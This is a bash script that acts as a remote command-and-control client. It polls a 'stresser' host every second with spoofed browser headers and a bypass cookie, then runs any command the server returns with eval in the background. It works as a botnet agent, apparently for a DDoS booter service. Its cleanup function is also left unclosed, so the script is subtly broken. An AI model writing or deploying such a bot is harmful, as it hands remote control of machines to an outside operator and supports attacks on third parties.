#!/bin/bash

# Configuration
URL="https://stresser.page.gd/?i=1"
COOKIE="__test=bcd5abe71d4af0d2b31a16cf5c9d8465"
USER_AGENT="Mozilla/5.0 (Linux; Android 14; SM-A356E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
INTERVAL=1
COMMAND_FILE="/tmp/last_command.txt"

echo "Starting request loop to $URL every $INTERVAL second(s)"
echo "Press Ctrl+C to stop"

# Initialize command file if it doesn't exist
if [ ! -f "$COMMAND_FILE" ]; then
    echo "" > "$COMMAND_FILE"
fi

# Cleanup function
cleanup() {
    echo -e "\nStopping script..."
    
trap cleanup SIGINT SIGTERM

# Main loop
while true; do
    # Send request and get response
    response=$(curl -s "$URL" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" \
        -H "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" \
        -H "Connection: keep-alive" \
        -H "Cookie: $COOKIE" \
        -H "Sec-Fetch-Dest: document" \
        -H "Sec-Fetch-Mode: navigate" \
        -H "Sec-Fetch-Site: none" \
        -H "Upgrade-Insecure-Requests: 1" \
        -H "User-Agent: $USER_AGENT" \
        -H "sec-ch-ua: \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"" \
        -H "sec-ch-ua-mobile: ?1" \
        -H "sec-ch-ua-platform: \"Android\"" \
        --compressed 2>/dev/null)
    
    # Clean response
    command=$(echo "$response" | tr -d '\n\r' | xargs)
    
    # Read last executed command
    last_command=$(cat "$COMMAND_FILE")
    
    # Check if we have a new command to execute
    if [ -n "$command" ] && [ "$command" != "nothing" ] && [ "$command" != "null" ] && [ "$command" != "$last_command" ]; then
        echo "New command received: $command"
        echo "Executing..."
        
        # Execute command in background
        eval "$command" &
        
        # Store the command to prevent re-execution
        echo "$command" > "$COMMAND_FILE"
        
        echo "Command started in background"
    elif [ -z "$command" ] || [ "$command" = "nothing" ] || [ "$command" = "null" ]; then
        # Clear the command file if "nothing" or empty command received
        if [ -n "$last_command" ]; then
            echo "Command cleared"
            echo "" > "$COMMAND_FILE"
        fi
    fi
    
    sleep $INTERVAL
done
